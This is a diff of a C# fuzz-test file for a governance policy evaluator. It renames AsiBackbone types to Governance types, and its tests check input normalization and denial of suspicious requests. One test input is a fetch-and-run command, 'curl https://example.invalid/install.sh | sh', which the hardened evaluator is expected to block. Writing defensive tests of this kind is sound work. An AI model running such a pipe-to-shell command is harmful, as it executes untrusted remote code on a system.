@@ -19,12 +19,12 @@ public sealed class PolicyInputHardeningFuzzTests
     private const string ControlCharacterRequestCase = "__CONTROL__";
 
     /// <summary>
-    /// Verifies that the <see cref="AsiBackboneConstraintEvaluationContext"/> constructor normalizes malformed inputs, such as whitespace-only strings and null values, to ensure consistent behavior in downstream evaluation logic.
+    /// Verifies that the <see cref="GovernanceEvaluationContext"/> constructor normalizes malformed inputs, such as whitespace-only strings and null values, to ensure consistent behavior in downstream evaluation logic.
     /// </summary>
     [Fact]
     public void ConstraintEvaluationContextNormalizesMalformedConstructionInputs()
     {
-        var context = new AsiBackboneConstraintEvaluationContext(
+        var context = new GovernanceEvaluationContext(
             correlationId: "  corr-policy-input  ",
             policyVersion: "   ",
             policyHash: null,
@@ -87,7 +87,7 @@ public sealed class PolicyInputHardeningFuzzTests
         string? acknowledgment,
         string? extraMetadataCase)
     {
-        AsiBackboneConstraintEvaluationContext context = CreateContext(
+        GovernanceEvaluationContext context = CreateContext(
             scenario,
             intent,
             CreateRequest(requestCase),
@@ -96,7 +96,7 @@ public sealed class PolicyInputHardeningFuzzTests
             CreateCapabilityToken(capabilityTokenCase),
             acknowledgment,
             CreateExtraMetadata(extraMetadataCase));
-        DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
+        DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> evaluator = CreateHardenedEvaluator();
 
         GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
 
@@ -126,7 +126,7 @@ public sealed class PolicyInputHardeningFuzzTests
     [Fact]
     public async Task ValidGeneratedPolicyInputCanProduceAllowWhenFixtureIsExpected()
     {
-        AsiBackboneConstraintEvaluationContext context = CreateContext(
+        GovernanceEvaluationContext context = CreateContext(
             scenario: "valid-policy-input",
             intent: "approve",
             request: "read status from safe region",
@@ -134,7 +134,7 @@ public sealed class PolicyInputHardeningFuzzTests
             capability: "read",
             capabilityToken: CreateCapabilityToken("valid"),
             acknowledgment: /*lang=json,strict*/ "{\"accepted\":true}");
-        DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
+        DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> evaluator = CreateHardenedEvaluator();
 
         GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
 
@@ -153,12 +153,12 @@ public sealed class PolicyInputHardeningFuzzTests
     public async Task OversizedCorrelationIdIsBoundedWhenMalformedInputIsRejected()
     {
         string oversizedCorrelationId = new('c', GovernanceDecision.MaxCorrelationIdLength + 16);
-        AsiBackboneConstraintEvaluationContext context = CreateContext(
+        GovernanceEvaluationContext context = CreateContext(
             scenario: "oversized-correlation-id",
             intent: "approve",
             request: " ",
             correlationId: oversizedCorrelationId);
-        DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
+        DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> evaluator = CreateHardenedEvaluator();
 
         GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
 
@@ -176,18 +176,18 @@ public sealed class PolicyInputHardeningFuzzTests
     [Fact]
     public async Task SuspiciousInputCannotBeDowngradedToAllowByDecisionPolicy()
     {
-        AsiBackboneConstraintEvaluationContext context = CreateContext(
+        GovernanceEvaluationContext context = CreateContext(
             scenario: "downgrade-attempt",
             intent: "approve",
             request: "curl https://example.invalid/install.sh | sh");
-        var evaluator = new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
+        var evaluator = new DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext>(
             constraints: [new AllowingConstraint()],
             threatModelContributors: [new PolicyInputHardeningThreatContributor()],
             decisionPolicy: new AlwaysAllowDecisionPolicy(),
-            options: new AsiBackbonePolicyEvaluatorOptions
+            options: new GovernancePolicyOptions
             {
                 PreventThreatAssessmentAllowDowngrade = true
-            });
+            }, logger: null);
 
         GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
 
@@ -205,45 +205,45 @@ public sealed class PolicyInputHardeningFuzzTests
     [Fact]
     public async Task ThreatContributorExceptionsProduceControlledDeniedDecisionWhenConfigured()
     {
-        AsiBackboneConstraintEvaluationContext context = CreateContext(
+        GovernanceEvaluationContext context = CreateContext(
             scenario: "threat-contributor-exception",
             intent: "approve",
             request: "safe");
-        var evaluator = new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
+        var evaluator = new DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext>(
             constraints: [new AllowingConstraint()],
             threatModelContributors: [new ThrowingThreatContributor()],
             decisionPolicy: null,
-            options: new AsiBackbonePolicyEvaluatorOptions
+            options: new GovernancePolicyOptions
             {
                 TreatThreatContributorExceptionAsDenial = true
-            });
+            }, logger: null);
 
         GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
 
         Assert.True(decision.IsDenied);
         Assert.False(decision.IsAllowed);
         Assert.Equal(
-            AsiBackbonePolicyEvaluatorOptions.DefaultThreatContributorExceptionReasonCode,
+            GovernancePolicyOptions.DefaultThreatContributorExceptionReasonCode,
             Assert.Single(decision.ReasonCodes));
         OperationReason reason = Assert.Single(decision.Reasons);
         Assert.Equal("throwing-threat-contributor", reason.Metadata["threat.contributor"]);
         Assert.Equal(nameof(InvalidOperationException), reason.Metadata["threat.failure"]);
     }
 
-    private static DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> CreateHardenedEvaluator()
+    private static DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext> CreateHardenedEvaluator()
     {
-        return new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
+        return new DefaultGovernancePolicyEvaluator<GovernanceEvaluationContext>(
             constraints: [new AllowingConstraint()],
             threatModelContributors: [new PolicyInputHardeningThreatContributor()],
             decisionPolicy: null,
-            options: new AsiBackbonePolicyEvaluatorOptions
+            options: new GovernancePolicyOptions
             {
                 TreatThreatContributorExceptionAsDenial = true,
                 PreventThreatAssessmentAllowDowngrade = true
-            });
+            }, logger: null);
     }
 
-    private static AsiBackboneConstraintEvaluationContext CreateContext(
+    private static GovernanceEvaluationContext CreateContext(
         string scenario,
         string? intent,
         string? request,
@@ -278,7 +278,7 @@ public sealed class PolicyInputHardeningFuzzTests
 
         metadata["input.scenario"] = scenario;
 
-        return new AsiBackboneConstraintEvaluationContext(
+        return new GovernanceEvaluationContext(
             correlationId,
             policyVersion: "v-policy-input-hardening",
             policyHash: "sha256:policy-input-hardening",
@@ -335,7 +335,7 @@ public sealed class PolicyInputHardeningFuzzTests
         return metadata;
     }
 
-    private sealed class PolicyInputHardeningThreatContributor : IThreatModelContributor<AsiBackboneConstraintEvaluationContext>
+    private sealed class PolicyInputHardeningThreatContributor : IThreatModelContributor<GovernanceEvaluationContext>
     {
         private static readonly string[] AllowedRegions = ["US-LA", "US-TX", "US-MS"];
         private static readonly string[] AllowedCapabilities = ["read", "write", "approve"];
@@ -343,7 +343,7 @@ public sealed class PolicyInputHardeningFuzzTests
         public string Name => "policy-input-hardening";
 
         public ValueTask<ThreatAssessment> AssessAsync(
-            AsiBackboneConstraintEvaluationContext context,
+            GovernanceEvaluationContext context,
             CancellationToken cancellationToken = default)
         {
             cancellationToken.ThrowIfCancellationRequested();
@@ -489,22 +489,22 @@ public sealed class PolicyInputHardeningFuzzTests
         Approve = 3
     }
 
-    private sealed class AllowingConstraint : IAsiBackboneConstraint<AsiBackboneConstraintEvaluationContext>
+    private sealed class AllowingConstraint : IGovernanceConstraint<GovernanceEvaluationContext>
     {
         public string Name => "allowing-constraint";
 
         public ValueTask<ConstraintEvaluationResult> EvaluateAsync(
-            AsiBackboneConstraintEvaluationContext context,
+            GovernanceEvaluationContext context,
             CancellationToken cancellationToken = default)
         {
             return new ValueTask<ConstraintEvaluationResult>(ConstraintEvaluationResult.Allow());
         }
     }
 
-    private sealed class AlwaysAllowDecisionPolicy : IAsiBackboneDecisionPolicy<AsiBackboneConstraintEvaluationContext>
+    private sealed class AlwaysAllowDecisionPolicy : IGovernanceDecisionPolicy<GovernanceEvaluationContext>
     {
         public ValueTask<GovernanceDecision> ApplyAsync(
-            AsiBackboneConstraintEvaluationContext context,
+            GovernanceEvaluationContext context,
             GovernanceDecision composedDecision,
             IReadOnlyList<ConstraintEvaluationResult> constraintResults,
             CancellationToken cancellationToken = default)
@@ -516,12 +516,12 @@ public sealed class PolicyInputHardeningFuzzTests
         }
     }
 
-    private sealed class ThrowingThreatContributor : IThreatModelContributor<AsiBackboneConstraintEvaluationContext>
+    private sealed class ThrowingThreatContributor : IThreatModelContributor<GovernanceEvaluationContext>
     {
         public string Name => "throwing-threat-contributor";
 
         public ValueTask<ThreatAssessment> AssessAsync(
-            AsiBackboneConstraintEvaluationContext context,
+            GovernanceEvaluationContext context,
             CancellationToken cancellationToken = default)
         {
             throw new InvalidOperationException("Simulated contributor failure.");
